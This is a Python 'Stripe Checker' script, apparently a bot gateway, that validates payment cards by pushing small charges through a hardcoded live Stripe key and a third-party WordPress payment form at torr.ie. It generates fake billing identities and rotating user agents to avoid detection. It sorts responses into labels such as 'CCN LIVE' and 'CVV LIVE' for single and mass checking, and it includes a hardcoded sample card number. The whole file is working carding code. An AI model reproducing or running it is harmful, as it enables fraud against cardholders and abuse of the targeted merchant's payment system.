# gatet5.py - Gateway 5 Stripe Checker
# Used by: /h5 (single 1.6-4.0$) & /v5 (mass 5.0-5.5$)
import requests
import json
import time
import random
import uuid
from faker import Faker

fake = Faker("en_US")

# ========== CLASSIFICATION KEYS ==========
success_keys = ["appreciate", "appreciated", "Payment Success", "redirect_to", "thank", "Thanks", "Gracias", "Thank", "redirectUrl", "succeeded", "confirmation", "Successful!", "Thanks!", "Successful", "hide_form", "redirect_url", "Merci", "Form entry saved", "Success!", "donation", "complete", "Payment successful", "charged", "payment_complete"]
ccn_keys = ["security code is incorrect", "INCORRECT_CVV", "card number is incorrect", "invalid", "Your card number is incorrect", "incorrect_number", "invalid_number"]
declined_keys = ["cannot be processed", "CARD_DECLINED", "Your card was declined.", "generic_decline", "cannot process your order", "declined", "card_declined"]
cvv_keys = ["transaction_not_allowed", "Your card does not support this type of purchase", "do_not_honor", "CVC", "incorrect_cvc", "incorrect_cvv", "cvc_check"]
insufficient_keys = ["Your card has insufficient funds.", "INSUFFICIENT_FUNDS", "insufficient_funds", "Insufficient Funds", "Insufficient", "insufficient"]
expired_keys = ["card has expired", "expired_card", "Card has expired"]
otp_keys = ["Verifying", "action_required", "verifying", "call_next_method", "requires_source_action", "CompletePaymentChallenge", "requires_action", "additional action before completion!", "nextAction", "three_d_secure", "redirect_to_3ds"]

def classify_response(last):
    last_lower = last.lower()
    if any(key.lower() in last_lower for key in success_keys): 
        return "HIT"
    if any(key.lower() in last_lower for key in otp_keys): 
        return "3DS"
    if any(key.lower() in last_lower for key in ccn_keys): 
        return "CCN"
    if any(key.lower() in last_lower for key in cvv_keys): 
        return "CVV"
    if any(key.lower() in last_lower for key in insufficient_keys): 
        return "INSUFFICIENT"
    if any(key.lower() in last_lower for key in expired_keys): 
        return "EXPIRED"
    if any(key.lower() in last_lower for key in declined_keys): 
        return "DECLINED"
    return "DEAD"

# ========== HELPER FUNCTIONS ==========
def gen_random_user_agent():
    chrome_version = random.randint(120, 137)
    user_agents = [
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36 Edg/{chrome_version}.0.0.0",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
        f"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        f"Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
    ]
    return random.choice(user_agents)

def gen_random_name():
    first_name = fake.first_name()
    last_name = fake.last_name()
    return first_name, last_name

def gen_random_email(first_name, last_name):
    domains = ["@gmail.com", "@hotmail.com", "@outlook.com", "@yahoo.com", "@protonmail.com", "@icloud.com"]
    random_num = random.randint(1000, 99999)
    email = f"{first_name.lower()}{random_num}{random.choice(domains)}"
    return email

def gen_random_phone():
    return f"07{random.randint(10000000, 99999999)}"

def gen_random_guid():
    return f"{uuid.uuid4()}{random.randint(10000, 99999)}"

def gen_random_address():
    return fake.street_address()

def gen_random_city():
    return fake.city()

def gen_random_zip():
    return fake.zipcode()

def gen_random_state():
    return fake.state()

# ========== MAIN TELE FUNCTION ==========
def Tele(ccx: str, amount: str = "1.60"):
    """
    Check credit card via Stripe Gateway 5
    Input: "card_number|month|year|cvv", amount
    Returns: (response_message, gateway_info)
    """
    
    ccx = ccx.strip()
    parts = ccx.split("|")
    
    if len(parts) != 4:
        return "ERROR: Invalid format", "Gate 5"
    
    n, mm, yy, cvc = parts
    
    # Fix year format (2026 -> 26)
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:4]
    
    charge_amount = str(amount)
    gateway_name = f"Gate 5 ${charge_amount}"
    
    # Generate random customer data
    first_name, last_name = gen_random_name()
    email = gen_random_email(first_name, last_name)
    full_name = f"{first_name} {last_name}"
    phone = gen_random_phone()
    address = gen_random_address()
    city = gen_random_city()
    state = gen_random_state()
    zip_code = gen_random_zip()
    
    # Generate random IDs
    guid = gen_random_guid()
    muid = gen_random_guid()
    sid = gen_random_guid()
    client_session_id = gen_random_guid()
    wallet_config_id = str(uuid.uuid4())
    
    # Stripe publishable key (Replace with actual live key)
    stripe_key = "pk_live_51JVKouAs6DndN9b8mx4e9zfXHN3jWXh6L0V2n3xk59hs90Nqy9RuqM2nqdjQkKPOB5DwBgoe9poeThAhanhLNPi900zHJa87Tz"
    
    session = requests.Session()
    session.cookies.set('__stripe_mid', muid)
    session.cookies.set('__stripe_sid', sid)
    session.headers.update({
        'Accept-Language': 'en-US,en;q=0.9',
        'User-Agent': gen_random_user_agent(),
    })
    
    # ========== STEP 1: Create Payment Method ==========
    url_stripe = "https://api.stripe.com/v1/payment_methods"
    
    stripe_data = (
        f'type=card'
        f'&billing_details[name]={full_name.replace(" ", "+")}'
        f'&billing_details[email]={email}'
        f'&billing_details[phone]={phone}'
        f'&billing_details[address][line1]={address.replace(" ", "+")}'
        f'&billing_details[address][city]={city}'
        f'&billing_details[address][state]={state}'
        f'&billing_details[address][postal_code]={zip_code}'
        f'&billing_details[address][country]=US'
        f'&card[number]={n}'
        f'&card[cvc]={cvc}'
        f'&card[exp_month]={mm}'
        f'&card[exp_year]={yy}'
        f'&guid={guid}'
        f'&muid={muid}'
        f'&sid={sid}'
        f'&pasted_fields=number'
        f'&payment_user_agent=stripe.js%2F922d612e68%3B+stripe-js-v3%2F922d612e68%3B+card-element'
        f'&referrer=https%3A%2F%2Ftorr.ie'
        f'&time_on_page={random.randint(20000, 80000)}'
        f'&client_attribution_metadata[client_session_id]={client_session_id}'
        f'&client_attribution_metadata[merchant_integration_source]=elements'
        f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
        f'&client_attribution_metadata[merchant_integration_version]=2017'
        f'&client_attribution_metadata[wallet_config_id]={wallet_config_id}'
        f'&key={stripe_key}'
    )
    
    headers_stripe = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': gen_random_user_agent(),
    }
    
    try:
        response = session.post(url_stripe, headers=headers_stripe, data=stripe_data, timeout=30)
    except requests.exceptions.RequestException as e:
        return f"NETWORK_ERROR: {str(e)[:80]}", gateway_name
    
    if response.status_code != 200:
        try:
            error_json = response.json()
            error_msg = error_json.get('error', {}).get('message', response.text[:200])
        except:
            error_msg = response.text[:200]
        
        error_lower = str(error_msg).lower()
        
        if any(k in error_lower for k in ['incorrect', 'invalid']) and 'number' in error_lower:
            return f"CCN - Wrong card number", gateway_name
        if any(k in error_lower for k in ['cvc', 'cvv']):
            return f"CVV - Wrong CVV", gateway_name
        if 'expired' in error_lower:
            return f"EXPIRED - Card expired", gateway_name
        if 'insufficient' in error_lower:
            return f"INSUFFICIENT - Low balance", gateway_name
        if 'declined' in error_lower:
            return f"DECLINED - Card declined", gateway_name
        if any(k in error_lower for k in ['3ds', 'authentication', 'action_required']):
            return f"3DS REQUIRED - Authentication needed", gateway_name
        
        return f"STRIPE_ERROR: {error_msg[:80]}", gateway_name
    
    try:
        response_json = response.json()
        if 'id' not in response_json:
            return f"STRIPE_ERROR: No ID", gateway_name
        payment_method_id = response_json['id']
    except Exception as e:
        return f"JSON_PARSE_ERROR: {str(e)[:80]}", gateway_name
    
    # ========== STEP 2: Process Payment with Full Billing Details ==========
    url_wp = "https://torr.ie/wp-admin/admin-ajax.php"
    
    wp_data = {
        'action': 'wp_full_stripe_inline_payment_charge',
        'wpfs-form-name': 'default',
        'wpfs-form-get-parameters': '{}',
        'wpfs-custom-amount-unique': charge_amount,
        'wpfs-custom-input[]': str(random.randint(10000, 99999)),
        'wpfs-card-holder-email': email,
        'wpfs-card-holder-name': full_name,
        'wpfs-stripe-payment-method-id': payment_method_id,
        'wpfs-billing-address': address,
        'wpfs-billing-city': city,
        'wpfs-billing-state': state,
        'wpfs-billing-zip': zip_code,
        'wpfs-billing-country': 'US',
    }
    
    headers_wp = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://torr.ie',
        'Referer': 'https://torr.ie/payments/',
        'User-Agent': gen_random_user_agent(),
        'X-Requested-With': 'XMLHttpRequest',
    }
    
    try:
        r2 = session.post(url_wp, data=wp_data, headers=headers_wp, timeout=30)
    except requests.exceptions.RequestException as e:
        return f"NETWORK_ERROR: {str(e)[:80]}", gateway_name
    
    try:
        response_json = r2.json()
        message = response_json.get('message', r2.text)
        status = classify_response(message)
        
        if status == "HIT":
            return f"APPROVED - Payment successful ✅ | ${charge_amount}", gateway_name
        elif status == "CCN":
            return f"CCN LIVE - CCN Match ✅ | ${charge_amount}", gateway_name
        elif status == "CVV":
            return f"CVV LIVE - CVV Match ✅ | ${charge_amount}", gateway_name
        elif status == "3DS":
            return f"3DS REQUIRED - 3D Secure 🔐 | ${charge_amount}", gateway_name
        elif status == "INSUFFICIENT":
            return f"INSUFFICIENT FUNDS - Low balance 💰 | ${charge_amount}", gateway_name
        elif status == "EXPIRED":
            return f"EXPIRED - Card expired 📅 | ${charge_amount}", gateway_name
        elif status == "DECLINED":
            return f"DECLINED - {message[:50]} | ${charge_amount}", gateway_name
        else:
            return f"DEAD - {message[:50]} | ${charge_amount}", gateway_name
            
    except:
        r2_text = r2.text
        status = classify_response(r2_text)
        
        if status == "HIT":
            return f"APPROVED - Payment successful ✅ | ${charge_amount}", gateway_name
        elif "thank" in r2_text.lower():
            return f"APPROVED - Thank you ✅ | ${charge_amount}", gateway_name
        elif "success" in r2_text.lower():
            return f"APPROVED - Success ✅ | ${charge_amount}", gateway_name
        else:
            return f"DEAD - {r2_text[:50]} | ${charge_amount}", gateway_name


# ========== TEST ==========
if __name__ == "__main__":
    print("=" * 60)
    print("Gate 5 - Stripe Checker")
    print("=" * 60)
    
    test_card = "4815821145363426|09|29|767"
    
    print(f"\n[+] Testing Single Check: {test_card}")
    print(f"[+] Amount: $1.60")
    print("-" * 60)
    
    result, gateway = Tele(test_card, "1.60")
    print(f"Result: {result}")
    print(f"Gateway: {gateway}")
    
    print(f"\n[+] Testing Mass Check: {test_card}")
    print(f"[+] Amount: $5.00")
    print("-" * 60)
    
    result, gateway = Tele(test_card, "5.00")
    print(f"Result: {result}")
    print(f"Gateway: {gateway}")
    print("=" * 60)
